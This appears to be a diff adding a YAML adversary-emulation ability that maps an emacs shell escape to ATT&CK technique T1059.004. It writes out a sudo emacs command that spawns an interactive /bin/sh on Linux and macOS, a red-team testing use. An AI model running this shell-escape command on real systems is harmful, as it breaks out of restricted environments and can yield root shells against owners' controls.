@@ -1,0 +1,21 @@
+---
+- id: 6ddec3f1ecf6f395e5c14f7936ef77f1
+  name: emacs spawning an interactive system shell
+  description: "emacs can be used to break out from restricted environments by spawning\
+    \ an interactive system shell. Ref: https://gtfobins.github.io/gtfobins/emacs/\
+    \  \n"
+  tactic: execution
+  technique:
+    attack_id: T1059.004
+    name: 'Command and Scripting Interpreter: Bash'
+  platforms:
+    linux:
+      sh:
+        command: sudo emacs -Q -nw --eval '(term "/bin/sh &")'
+        payloads: []
+        cleanup: ''
+    darwin:
+      sh:
+        command: sudo emacs -Q -nw --eval '(term "/bin/sh &")'
+        payloads: []
+        cleanup: ''
